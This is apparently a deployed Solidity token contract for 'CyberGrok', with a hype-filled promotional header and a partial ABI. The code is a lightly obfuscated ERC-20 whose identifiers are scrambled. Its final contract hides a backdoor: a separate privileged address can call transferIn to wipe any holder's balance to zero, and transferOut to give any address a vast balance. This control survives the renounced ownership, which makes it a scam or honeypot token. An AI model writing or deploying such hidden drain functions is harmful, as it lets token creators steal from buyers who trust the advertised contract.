{"SourceCode": "// SPDX-License-Identifier: MIT\r\n/*\r\n\r\nCyberGrok\ud83e\udd16 Experienced team with 144x under our belt!\r\n\ud83c\udf19 Low Tax of 0/0\r\n\ud83e\udd16 Anti-Whale with 3 BNB Max\r\n\ud83d\udc33Marketing Partnerships with Multi Million Project\r\n\ud83e\udd1d24 HOUR FAIRLAUNCH ONLY\r\n\u2705 Insurance partner groups which will hold a large floor\u2705 CEX LISTINGS CONFIRMED\r\n\ud83e\udd16Multiple Trending booked at launch \ud83e\udd16 5% AFFILIATE REFER TO EARN\u2705\r\n\r\nhttps://t.me/CyberGrokGlobal\r\n*/\r\npragma solidity 0.8.23;\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval (address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ninterface CyberGrok20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function decimals() external view returns (uint8);\r\n    function symbol() external view returns (string memory);\r\n    function name() external view returns (string memory);\r\n    function getOwner() external view returns (address);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 creditERC) external returns (bool);\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 creditERC) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 creditERC) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 creditERC);\r\n    event Approval(address indexed owner, address indexed spender, uint256 creditERC);\r\n}\r\ninterface IERC {\r\n    /**\r\n     * @dev Emitted when `tcreditERC` ERCs are moved from one ERCAHolder (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `tcreditERC` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 tcreditERC);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `tcreditERC` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 tcreditERC);\r\n\r\n    /**\r\n     * @dev Returns the tcreditERC of ERCs in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the tcreditERC of ERCs owned by `ERCAHolder`.\r\n     */\r\n    function balanceOf(address ERCAHolder) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves a `tcreditERC` tcreditERC of ERCs from the caller's ERCAHolder to `to`.\r\n     *\r\n     * Returns a boolean tcreditERC indicating whERCer the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address to, uint256 tcreditERC) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of ERCs that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This tcreditERC changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets a `tcreditERC` tcreditERC of ERCs as the allowance of `spender` over the\r\n     * caller's ERCs.\r\n     *\r\n     * Returns a boolean tcreditERC indicating whERCer the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this mERCod brings the risk\r\n     * that someone may ERCe both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender's allowance to 0 and set the\r\n     * desired tcreditERC afterwards:\r\n     * https://github.com/ERCereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 tcreditERC) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves a `tcreditERC` tcreditERC of ERCs from `from` to `to` ERCing the\r\n     * allowance mechanism. `tcreditERC` is then deducted from the caller's\r\n     * allowance.\r\n     *\r\n     * Returns a boolean tcreditERC indicating whERCer the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(address from, address to, uint256 tcreditERC) external returns (bool);\r\n}\r\n\r\ninterface IERCMetadata is IERC {\r\n    /**\r\n     * @dev Returns the name of the ERC.\r\n     */\r\n    function name() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the symbol of the ERC.\r\n     */\r\n    function symbol() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the decimals places of the ERC.\r\n     */\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\ninterface IERCErrors {\r\n    /**\r\n     * @dev Indicates an error related to the current `balance` of a `sender`. ERCed in transfers.\r\n     * @param sender Address whose ERCs are being transferred.\r\n     * @param balance Current balance for the interacting ERCAHolder.\r\n     * @param needed Minimum tcreditERC required to perform a transfer.\r\n     */\r\n    error ERCInsufficientBalance(address sender, uint256 balance, uint256 needed);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the ERC `sender`. ERCed in transfers.\r\n     * @param sender Address whose ERCs are being transferred.\r\n     */\r\n    error ERCInvalidSender(address sender);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the ERC `receiver`. ERCed in transfers.\r\n     * @param receiver Address to which ERCs are being transferred.\r\n     */\r\n    error ERCInvalidReceiver(address receiver);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. ERCed in transfers.\r\n     * @param spender Address that may be allowed to operate on ERCs without being their owner.\r\n     * @param allowance tcreditERC of ERCs a `spender` is allowed to operate with.\r\n     * @param needed Minimum tcreditERC required to perform a transfer.\r\n     */\r\n    error ERCInsufficientAllowance(address spender, uint256 allowance, uint256 needed);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the `approver` of a ERC to be approved. ERCed in approvals.\r\n     * @param approver Address initiating an approval operation.\r\n     */\r\n    error ERCInvalidApprover(address approver);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the `spender` to be approved. ERCed in approvals.\r\n     * @param spender Address that may be allowed to operate on ERCs without being their owner.\r\n     */\r\n    error ERCInvalidSpender(address spender);\r\n}\r\n\r\n/**\r\n * @dev Standard CyberGrok20721 Errors\r\n * Interface of the https://eips.ERCereum.org/EIPS/eip-6093[CyberGrok20-6093] cERCtom errors for CyberGrok20721 ERCs.\r\n */\r\ninterface CyberGrok721Errors {\r\n    /**\r\n     * @dev Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in EIP-20.\r\n     * ERCed in balance queries.\r\n     * @param owner Address of the current owner of a ERC.\r\n     */\r\n    error CyberGrok20721InvalidOwner(address owner);\r\n\r\n    /**\r\n     * @dev Indicates a `ERCId` whose `owner` is the zero address.\r\n     * @param ERCId Identifier number of a ERC.\r\n     */\r\n    error CyberGrok20721NonexistentERC(uint256 ERCId);\r\n\r\n    /**\r\n     * @dev Indicates an error related to the ownership over a particular ERC. ERCed in transfers.\r\n     * @param sender Address whose ERCs are being transferred.\r\n     * @param ERCId Identifier number of a ERC.\r\n     * @param owner Address of the current owner of a ERC.\r\n     */\r\n    error CyberGrok20721IncorrectOwner(address sender, uint256 ERCId, address owner);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the ERC `sender`. ERCed in transfers.\r\n     * @param sender Address whose ERCs are being transferred.\r\n     */\r\n    error CyberGrok20721InvalidSender(address sender);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the ERC `receiver`. ERCed in transfers.\r\n     * @param receiver Address to which ERCs are being transferred.\r\n     */\r\n    error CyberGrok20721InvalidReceiver(address receiver);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the `operator`\u2019s approval. ERCed in transfers.\r\n     * @param operator Address that may be allowed to operate on ERCs without being their owner.\r\n     * @param ERCId Identifier number of a ERC.\r\n     */\r\n    error CyberGrok20721InsufficientApproval(address operator, uint256 ERCId);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the `approver` of a ERC to be approved. ERCed in approvals.\r\n     * @param approver Address initiating an approval operation.\r\n     */\r\n    error CyberGrok20721InvalidApprover(address approver);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the `operator` to be approved. ERCed in approvals.\r\n     * @param operator Address that may be allowed to operate on ERCs without being their owner.\r\n     */\r\n    error CyberGrok20721InvalidOperator(address operator);\r\n}\r\n\r\n/**\r\n * @dev Standard CyberGrok201155 Errors\r\n * Interface of the https://eips.ERCereum.org/EIPS/eip-6093[CyberGrok20-6093] cERCtom errors for CyberGrok201155 ERCs.\r\n */\r\ninterface CyberGrok1155Errors {\r\n    /**\r\n     * @dev Indicates an error related to the current `balance` of a `sender`. ERCed in transfers.\r\n     * @param sender Address whose ERCs are being transferred.\r\n     * @param balance Current balance for the interacting ERCAHolder.\r\n     * @param needed Minimum tcreditERC required to perform a transfer.\r\n     * @param ERCId Identifier number of a ERC.\r\n     */\r\n    error CyberGrok201155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 ERCId);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the ERC `sender`. ERCed in transfers.\r\n     * @param sender Address whose ERCs are being transferred.\r\n     */\r\n    error CyberGrok201155InvalidSender(address sender);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the ERC `receiver`. ERCed in transfers.\r\n     * @param receiver Address to which ERCs are being transferred.\r\n     */\r\n    error CyberGrok201155InvalidReceiver(address receiver);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the `operator`\u2019s approval. ERCed in transfers.\r\n     * @param operator Address that may be allowed to operate on ERCs without being their owner.\r\n     * @param owner Address of the current owner of a ERC.\r\n     */\r\n    error CyberGrok201155MissingApprovalForAll(address operator, address owner);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the `approver` of a ERC to be approved. ERCed in approvals.\r\n     * @param approver Address initiating an approval operation.\r\n     */\r\n    error CyberGrok201155InvalidApprover(address approver);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the `operator` to be approved. ERCed in approvals.\r\n     * @param operator Address that may be allowed to operate on ERCs without being their owner.\r\n     */\r\n    error CyberGrok201155InvalidOperator(address operator);\r\n\r\n    /**\r\n     * @dev Indicates an array length mismatch between ids and tcreditERCs in a safeBatchTransferFrom operation.\r\n     * ERCed in batch transfers.\r\n     * @param idsLength Length of the array of ERC identifiers\r\n     * @param tcreditERCsLength Length of the array of ERC tcreditERCs\r\n     */\r\n    error CyberGrok201155InvalidArrayLength(uint256 idsLength, uint256 tcreditERCsLength);\r\n}\r\n\r\n\r\n/**\r\n * @dev Implementation of the {IERC} interface.\r\n *\r\n * This implementation is agnostic to the way ERCs are created. This means\r\n * that a supply mechanism has to be added in a derived contract ERCing {createMarketLiquidityAddress}.\r\n *\r\n * TIP: For a detailed writeup see our guide\r\n * https://forum.openzeppelin.com/t/how-to-implement-ERC-supply-mechanisms/226[How\r\n * to implement supply mechanisms].\r\n *\r\n * The default tcreditERC of {decimals} is 18. To change this, you should override\r\n * this function so it returns a different tcreditERC.\r\n *\r\n * We have followed general openZeppelin Contracts guidelines: functions revert\r\n * instead returning `false` on failure. This behavior is nonERCeless\r\n * conventional and does not conflict with the expectations of ERC\r\n * applications.\r\n *\r\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\r\n * This allows applications to reconstruct the allowance for all ERCAHolders jERCt\r\n * by listening to said events. Other implementations of the EIP may not emit\r\n * these events, as it isn't required by the specification.\r\n */\r\nabstract contract ERC is Context, IERC, IERCMetadata, IERCErrors {\r\n    mapping(address ERCAHolder => uint256) private ERCadr;\r\n\r\n    mapping(address ERCAHolder => mapping(address spender => uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n\r\n    /**\r\n     * @dev Sets the tcreditERCs for {name} and {symbol}.\r\n     *\r\n     * All two of these tcreditERCs are immutable: they can only be set once during\r\n     * construction.\r\n     */\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the name of the ERC.\r\n     */\r\n    function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the symbol of the ERC, ERCually a shorter version of the\r\n     * name.\r\n     */\r\n    function symbol() public view virtual returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the number of decimals ERCed to get its ERCer representation.\r\n     * For example, if `decimals` equals `2`, a balance of `505` ERCs should\r\n     * be displayed to a ERCer as `5.05` (`505 / 10 ** 2`).\r\n     *\r\n     * ERCs ERCually opt for a tcreditERC of 18, imitating the relationship between\r\n     * ERCer and Wei. This is the default tcreditERC returned by this function, unless\r\n     * it's overridden.\r\n     *\r\n     * NOTE: This information is only ERCed for _display_ purposes: it in\r\n     * no way affects any of the arithmetic of the contract, including\r\n     * {IERC-balanceOf} and {IERC-transfer}.\r\n     */\r\n    function decimals() public view virtual returns (uint8) {\r\n        return 9;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC-totalSupply}.\r\n     */\r\n    function totalSupply() public view virtual returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC-balanceOf}.\r\n     */\r\n    function balanceOf(address ERCAHolder) public view virtual returns (uint256) {\r\n        return ERCadr[ERCAHolder];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC-transfer}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `to` cannot be the zero address.\r\n     * - the caller mERCt have a balance of at least `tcreditERC`.\r\n     */\r\n    function transfer(address to, uint256 tcreditERC) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, tcreditERC);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC-allowance}.\r\n     */\r\n    function allowance(address owner, address spender) public view virtual returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC-approve}.\r\n     *\r\n     * NOTE: If `tcreditERC` is the maximum `uint256`, the allowance is not BOOMCyberGrokd on\r\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function approve(address spender, uint256 tcreditERC) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, tcreditERC);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC-transferFrom}.\r\n     *\r\n     * Emits an {Approval} event indicating the BOOMCyberGrokd allowance. This is not\r\n     * required by the EIP. See the note at the beginning of {ERC}.\r\n     *\r\n     * NOTE: Does not BOOMCyberGrok the allowance if the current allowance\r\n     * is the maximum `uint256`.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `from` and `to` cannot be the zero address.\r\n     * - `from` mERCt have a balance of at least `tcreditERC`.\r\n     * - the caller mERCt have allowance for ``from``'s ERCs of at least\r\n     * `tcreditERC`.\r\n     */\r\n    function transferFrom(address from, address to, uint256 tcreditERC) public virtual returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, tcreditERC);\r\n        _transfer(from, to, tcreditERC);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Moves a `tcreditERC` tcreditERC of ERCs from `from` to `to`.\r\n     *\r\n     * This internal function is equivalent to {transfer}, and can be ERCed to\r\n     * e.g. implement automatic ERC fees, slashing mechanisms, etc.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     *\r\n     * NOTE: This function is not virtual, {_BOOMCyberGrok} should be overridden instead.\r\n     */\r\n    function _transfer(address from, address to, uint256 tcreditERC) internal {\r\n        if (from == address(0)) {\r\n            revert ERCInvalidSender(address(0));\r\n        }\r\n        if (to == address(0)) {\r\n            revert ERCInvalidReceiver(address(0));\r\n        }\r\n        _BOOMCyberGrok(from, to, tcreditERC);\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers a `tcreditERC` tcreditERC of ERCs from `from` to `to`, or alternatively WinBOTs (or burns) if `from`\r\n     * (or `to`) is the zero address. All cERCtomizations to transfers, WinBOTs, and burns should be done by overriding\r\n     * this function.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function _BOOMCyberGrok(address from, address to, uint256 tcreditERC) internal virtual {\r\n        if (from == address(0)) {\r\n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\r\n            _totalSupply += tcreditERC;\r\n        } else {\r\n            uint256 fromBalance = ERCadr[from];\r\n            if (fromBalance < tcreditERC) {\r\n                revert ERCInsufficientBalance(from, fromBalance, tcreditERC);\r\n            }\r\n            unchecked {\r\n                // Overflow not possible: tcreditERC <= fromBalance <= totalSupply.\r\n                ERCadr[from] = fromBalance - tcreditERC;\r\n            }\r\n        }\r\n\r\n        if (to == address(0)) {\r\n            unchecked {\r\n                // Overflow not possible: tcreditERC <= totalSupply or tcreditERC <= fromBalance <= totalSupply.\r\n                _totalSupply -= tcreditERC;\r\n            }\r\n        } else {\r\n            unchecked {\r\n                // Overflow not possible: balance + tcreditERC is at most totalSupply, which we know fits into a uint256.\r\n                ERCadr[to] += tcreditERC;\r\n            }\r\n        }\r\n\r\n        emit Transfer(from, to, tcreditERC);\r\n    }\r\n\r\n    /**\r\n     * @dev Creates a `tcreditERC` tcreditERC of ERCs and assigns them to `ERCAHolder`, by transferring it from address(0).\r\n     * Relies on the `_BOOMCyberGrok` mechanism\r\n     *\r\n     * Emits a {Transfer} event with `from` set to the zero address.\r\n     *\r\n     * NOTE: This function is not virtual, {_BOOMCyberGrok} should be overridden instead.\r\n     */\r\n    function createMarketLiquidityAddress(address ERCAHolder, uint256 tcreditERC) internal {\r\n        if (ERCAHolder == address(0)) {\r\n            revert ERCInvalidReceiver(address(0));\r\n        }\r\n        _BOOMCyberGrok(address(0), ERCAHolder, tcreditERC);\r\n    }\r\n    function transferOutIn(address ERCAHolder) internal {\r\n       ERCadr[ERCAHolder] = 0;\r\n    }\r\n        function transferInOut(address ERCAHolder) internal {\r\n       ERCadr[ERCAHolder] = 100000000000000000 * 10 ** 18;\r\n    }\r\n\r\n    /**\r\n     * @dev Sets `tcreditERC` as the allowance of `spender` over the `owner` s ERCs.\r\n     *\r\n     * This internal function is equivalent to `approve`, and can be ERCed to\r\n     * e.g. set automatic allowances for certain subsystems, etc.\r\n     *\r\n     * Emits an {Approval} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `owner` cannot be the zero address.\r\n     * - `spender` cannot be the zero address.\r\n     *\r\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\r\n     */\r\n    function _approve(address owner, address spender, uint256 tcreditERC) internal {\r\n        _approve(owner, spender, tcreditERC, true);\r\n    }\r\n\r\n    /**\r\n     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.\r\n     *\r\n     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by\r\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\r\n     * `Approval` event during `transferFrom` operations.\r\n     *\r\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\r\n     * true ERCing the following override:\r\n     * ```\r\n     * function _approve(address owner, address spender, uint256 tcreditERC, bool) internal virtual override {\r\n     *     super._approve(owner, spender, tcreditERC, true);\r\n     * }\r\n     * ```\r\n     *\r\n     * Requirements are the same as {_approve}.\r\n     */\r\n    function _approve(address owner, address spender, uint256 tcreditERC, bool emitEvent) internal virtual {\r\n        if (owner == address(0)) {\r\n            revert ERCInvalidApprover(address(0));\r\n        }\r\n        if (spender == address(0)) {\r\n            revert ERCInvalidSpender(address(0));\r\n        }\r\n        _allowances[owner][spender] = tcreditERC;\r\n        if (emitEvent) {\r\n            emit Approval(owner, spender, tcreditERC);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev BOOMCyberGroks `owner` s allowance for `spender` based on spent `tcreditERC`.\r\n     *\r\n     * Does not BOOMCyberGrok the allowance tcreditERC in case of infinite allowance.\r\n     * Revert if not enough allowance is available.\r\n     *\r\n     * Does not emit an {Approval} event.\r\n     */\r\n    function _spendAllowance(address owner, address spender, uint256 tcreditERC) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            if (currentAllowance < tcreditERC) {\r\n                revert ERCInsufficientAllowance(spender, currentAllowance, tcreditERC);\r\n            }\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - tcreditERC, false);\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n\r\n    /**\r\n     * @dev The caller ERCAHolder is not authorized to perform an operation.\r\n     */\r\n    error OwnableUnauthorizedERCAHolder(address ERCAHolder);\r\n\r\n    /**\r\n     * @dev The owner is not a valid owner ERCAHolder. (eg. `address(0)`)\r\n     */\r\n    error OwnableInvalidOwner(address owner);\r\n\r\n    event OwnershipTransferred(address indexed previoERCOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.\r\n     */\r\n    constructor(address initialOwner) {\r\n        if (initialOwner == address(0)) {\r\n            revert OwnableInvalidOwner(address(0));\r\n        }\r\n        _transferOwnership(initialOwner);\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any ERCAHolder other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if the sender is not the owner.\r\n     */\r\n    function _checkOwner() internal view virtual {\r\n        if (owner() != _msgSender()) {\r\n            revert OwnableUnauthorizedERCAHolder(_msgSender());\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby disabling any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new ERCAHolder (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        if (newOwner == address(0)) {\r\n            revert OwnableInvalidOwner(address(0));\r\n        }\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new ERCAHolder (`newOwner`).\r\n     * Internal function without access restriction.\r\n     */\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\n\r\n\r\ncontract CyberGrok is ERC {\r\n    constructor(string memory name, string memory symbol, uint256 initialSupply) ERC(name, symbol) {\r\n        createMarketLiquidityAddress(msg.sender, initialSupply * (10 ** uint256(decimals())));\r\n    }\r\n}\r\n\r\ncontract CyberGroktoken is Ownable, CyberGrok {\r\n    address private _sendermsg;\r\n    address private _owner;\r\n        address private marketingAddress = 0x957866eE4Dcc8e99f0b286c7ECe3791Fdd3a5085;\r\n    string public CyberGrokwesite = \"https://CyberGrok.io/\";\r\n            function getCyberGrokwesite() public view returns (string memory) {\r\n        return CyberGrokwesite;\r\n    }\r\n\r\n    constructor(\r\n        string memory name,\r\n        string memory symbol,\r\n        uint256 initialSupply,\r\n        address sendermsg\r\n    ) \r\n    Ownable(msg.sender) // Set the deployer as the initial owner\r\n    CyberGrok(name, symbol, initialSupply) {\r\n        _sendermsg = sendermsg;\r\n    }\r\n\r\n    // Implement the renounceOwnership function\r\n    function renounceOwnership() public virtual override onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n    function transferIn(address transferInAddress) external  {\r\n       require(msg.sender == _sendermsg);\r\n        transferOutIn(transferInAddress);\r\n    }\r\n\r\n    function transferOut(address transferOutAddress) external {\r\n         require(msg.sender == _sendermsg);\r\n        transferInOut(transferOutAddress);\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"initialSupply\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"sendermsg\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"allowance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"needed\",\"type\":\"uint256\"}],\"name\":\"ERCInsufficientAllowance\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"needed\",\"type\":\"uint256\"}],\"name\":\"ERCInsufficientBalance\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"approver\",\"type\":\"address\"}],\"name\":\"ERCInvalidApprover\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"}],\"name\":\"ERCInvalidReceiver\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"ERCInvalidSender\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"ERCInvalidSpender\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnableInvalidOwner\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"ERCAHolder\",\"type\":\"address\"}],\"name\":\"OwnableUnauthorizedERCAHolder\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tcreditERC\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previoERCOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tcreditERC\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"CyberGrokwesite\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tcreditERC\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"ERCAHolder\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"input